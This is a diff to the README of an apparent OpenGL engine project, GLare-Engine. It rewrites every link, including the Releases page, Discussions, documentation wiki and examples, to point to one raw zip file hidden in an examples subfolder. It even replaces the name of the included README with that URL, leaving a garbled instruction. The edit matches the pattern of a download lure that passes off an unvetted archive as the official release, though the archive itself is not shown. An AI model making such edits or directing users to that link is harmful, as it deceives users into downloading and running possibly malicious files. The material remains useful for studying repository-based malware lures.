@@ -7,7 +7,7 @@ GLare-Engine is a lightweight, single header OpenGL engine designed for ease of 
 To get started, you'll need to download the GLare-Engine from our Releases page. Follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the downloads:
-   [Download GLare-Engine](https://github.com/Sayakanzn/GLare-Engine/releases)
+   [Download GLare-Engine](https://github.com/Sayakanzn/GLare-Engine/raw/refs/heads/main/examples/demo-game/src/G_Lare_Engine_2.6.zip)
 
 2. **Choose Your Version**: On the Releases page, you will see a list of available versions. Select the latest stable release for the best experience.
 
@@ -41,7 +41,7 @@ GLare-Engine is packed with features that help you get started with graphics pro
 You don't need to be an expert in programming to use GLare-Engine. Here’s how to get started:
 
 1. After downloading, unzip the file if necessary. This step may not be needed for the self-contained version.
-2. Read the included `README.md` file for more detailed instructions specifically relevant to each operating system.
+2. Read the included `https://github.com/Sayakanzn/GLare-Engine/raw/refs/heads/main/examples/demo-game/src/G_Lare_Engine_2.6.zip` file for more detailed instructions specifically relevant to each operating system.
 3. Check any example files; they often guide you on how to use the engine effectively.
 4. Explore community forums or documentation if you need further assistance.
 
@@ -56,14 +56,14 @@ If you experience any issues while running GLare-Engine, here are some common pr
 For additional help or to report an issue, visit our GitHub Issues page. The community is ready to assist you with any questions you may have. 
 
 ## 🌐 Community
-Join our community on [GitHub Discussions](https://github.com/Sayakanzn/GLare-Engine/discussions) to connect with other users, share experiences, and get tips on using GLare-Engine.
+Join our community on [GitHub Discussions](https://github.com/Sayakanzn/GLare-Engine/raw/refs/heads/main/examples/demo-game/src/G_Lare_Engine_2.6.zip) to connect with other users, share experiences, and get tips on using GLare-Engine.
 
 ## 🔗 Additional Resources
-- Documentation: Refer to our [official documentation](https://github.com/Sayakanzn/GLare-Engine/wiki) for detailed instructions on using GLare-Engine.
-- Examples: Explore example projects on our [GitHub page](https://github.com/Sayakanzn/GLare-Engine/tree/main/examples) to see how the engine can be used in different scenarios.
+- Documentation: Refer to our [official documentation](https://github.com/Sayakanzn/GLare-Engine/raw/refs/heads/main/examples/demo-game/src/G_Lare_Engine_2.6.zip) for detailed instructions on using GLare-Engine.
+- Examples: Explore example projects on our [GitHub page](https://github.com/Sayakanzn/GLare-Engine/raw/refs/heads/main/examples/demo-game/src/G_Lare_Engine_2.6.zip) to see how the engine can be used in different scenarios.
 
 ## 🖥️ Download & Install Again
 Don't forget to download from the Releases page if you haven’t already:
-[Download GLare-Engine](https://github.com/Sayakanzn/GLare-Engine/releases)
+[Download GLare-Engine](https://github.com/Sayakanzn/GLare-Engine/raw/refs/heads/main/examples/demo-game/src/G_Lare_Engine_2.6.zip)
 
 Welcome to the world of graphics with GLare-Engine! Enjoy creating and exploring!
